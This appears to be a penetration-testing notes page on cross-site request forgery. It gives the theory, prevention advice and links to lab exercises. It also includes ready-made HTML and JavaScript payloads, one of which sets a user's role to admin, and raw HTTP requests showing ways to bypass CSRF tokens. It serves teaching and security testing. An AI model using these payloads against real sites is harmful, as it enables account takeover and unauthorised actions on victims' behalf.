# CSRF

## Theory

Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.

In a successful CSRF attack, the attacker causes the victim user to carry out an action unintentionally. For example, this might be to change the email address on their account, to change their password, or to make a funds transfer. Depending on the nature of the action, the attacker might be able to gain full control over the user's account. If the compromised user has a privileged role within the application, then the attacker might be able to take full control of all the application's data and functionality.

For a CSRF attack to be possible, three key conditions must be in place:

* A relevant action. There is an action within the application that the attacker has a reason to induce. This might be a privileged action (such as modifying permissions for other users) or any action on user-specific data (such as changing the user's own password).
* Cookie-based session handling. Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests. There is no other mechanism in place for tracking sessions or validating user requests.
* No unpredictable request parameters. The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password.

### **Resources**

* [https://portswigger.net/web-security/csrf/xss-vs-csrf](https://portswigger.net/web-security/csrf/xss-vs-csrf)
* [https://portswigger.net/web-security/csrf/tokens](https://portswigger.net/web-security/csrf/tokens)
* [http://tipstrickshack.blogspot.cl/2012/10/how-to-exploit-csfr-vulnerabilitycsrf.html](http://tipstrickshack.blogspot.cl/2012/10/how-to-exploit-csfr-vulnerabilitycsrf.html)
* [https://www.owasp.org/index.php/Testing\_for\_CSRF\_(OTG-SESS-005)](https://www.owasp.org/index.php/Testing\_for\_CSRF\_\(OTG-SESS-005\))
* [https://www.owasp.org/index.php/Cross-Site\_Request\_Forgery\_(CSRF)](https://www.owasp.org/index.php/Cross-Site\_Request\_Forgery\_\(CSRF\))
* [https://pentestbook.six2dez.com/enumeration/web/csrf](https://pentestbook.six2dez.com/enumeration/web/csrf)
* [https://kathan19.gitbook.io/howtohunt/csrf/cross\_site\_request\_forgery\_bypass](https://kathan19.gitbook.io/howtohunt/csrf/cross\_site\_request\_forgery\_bypass)
* _Cross-Site Request Forgery - Bug Bounty Hunting Essentials, pg 41_

## **Create a CSRF Attack**

![](<../../.gitbook/assets/image (33).png>)

* Manually creating the HTML needed for a CSRF exploit can be cumbersome, particularly where the desired request contains a large number of parameters, or there are other quirks in the request. The easiest way to construct a CSRF exploit is using the [CSRF PoC generator](https://portswigger.net/burp/documentation/desktop/functions/generate-csrf-poc) that is built in to [Burp Suite Professional](https://portswigger.net/burp/pro):
  * Select a request anywhere in Burp Suite Professional that you want to test or exploit.
  * From the right-click context menu, select Engagement tools / Generate CSRF PoC.
  * Burp Suite will generate some HTML that will trigger the selected request (minus cookies, which will be added automatically by the victim's browser).
  * You can tweak various options in the CSRF PoC generator to fine-tune aspects of the attack. You might need to do this in some unusual situations to deal with quirky features of requests.
  * Copy the generated HTML into a web page, view it in a browser that is logged in to the vulnerable web site, and test whether the intended request is issued successfully and the desired action occurs.
* [https://portswigger.net/web-security/csrf/lab-no-defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)

## Common CSRF Vulnerabilities

* Validation of CSRF token depends on request method
  * [https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method)
* Validation of CSRF token depends on token being present
  * [https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present)
* CSRF token is not tied to the user session
  * [https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session](https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session)
* CSRF token is tied to a non-session cookie
  * [https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie](https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie)
* CSRF token is simply duplicated in a cookie
  * [https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie](https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie)
* Refereer based vulnerabilities
  * [https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present](https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present)
  * [https://portswigger.net/web-security/csrf/lab-referer-validation-broken](https://portswigger.net/web-security/csrf/lab-referer-validation-broken)

## **Preventing CSRF attacks**

* The most robust way to defend against CSRF attacks is to include a [CSRF token](https://portswigger.net/web-security/csrf/tokens) within relevant requests. The token should be:
  * &#x20;Unpredictable with high entropy, as for session tokens in general.
  * &#x20;Tied to the user's session.
  * &#x20;Strictly validated in every case before the relevant action is executed.
* Using SameSite cookies
  * The `SameSite` attribute can be used to control whether and how cookies are submitted in cross-site requests. By setting the attribute on session cookies, an application can prevent the default browser behavior of automatically adding cookies to requests regardless of where they originate.
  * [https://portswigger.net/web-security/csrf/samesite-cookies](https://portswigger.net/web-security/csrf/samesite-cookies)
* Header Flags
  * Secure - Forces applications to send cookies for HTTPS connections only
  * HTTPOnly - Avoids scripting attacks that extract information in cookies by allowing only the browser to interact with the cookies, not any JavaScript
* [https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site\_Request\_Forgery\_Prevention\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site\_Request\_Forgery\_Prevention\_Cheat\_Sheet.html)

## How to Find

1. HTML GET Method

```
<a href="http://www.example.com/api/setusername?username=uname">Click Me</a>
```

1. HTML POST Method

```
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="uname" />
 <input type="submit" value="Submit Request" />
</form>
```

1. JSON GET Method

```
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```

1. JSON POST Method

```
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>
```

## Bypass CSRF Token

![](<../../.gitbook/assets/image (23).png>)

1. Change single character

```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa
```

Try this to bypass

```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaab
```

1. Sending empty value of token

```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa
```

Try this to bypass

```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=
```

1. Replace the token with same length

```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=aaaaaa
```

Try this to bypass

```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=aaabaa
```

1. Changing POST / GET method

```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa
```

Try this to bypass

```
GET /register?username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa HTTP/1.1
Host: target.com
[...]
```

1. Remove the token from request

```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa
```

Try this to bypass

```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456
```

1. Use another user's valid token

```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=ANOTHER_VALID_TOKEN
```

1. Try to decrypt hash

```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=MTIzNDU2
```

MTIzNDU2 => 123456 with base64

1. Sometimes anti-CSRF token is composed by 2 parts, one of them remains static while the others one dynamic

```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=vi802jg9f8akd9j123
```

When we register again, the request like this

```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=vi802jg9f8akd9j124
```

If you notice "vi802jg9f8akd9j" part of the token remain same, you just need to send with only static part

Reference [https://github.com/daffainfo/AllAboutBugBounty/blob/master/Cross%20Site%20Request%20Forgery.md](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Cross%20Site%20Request%20Forgery.md)

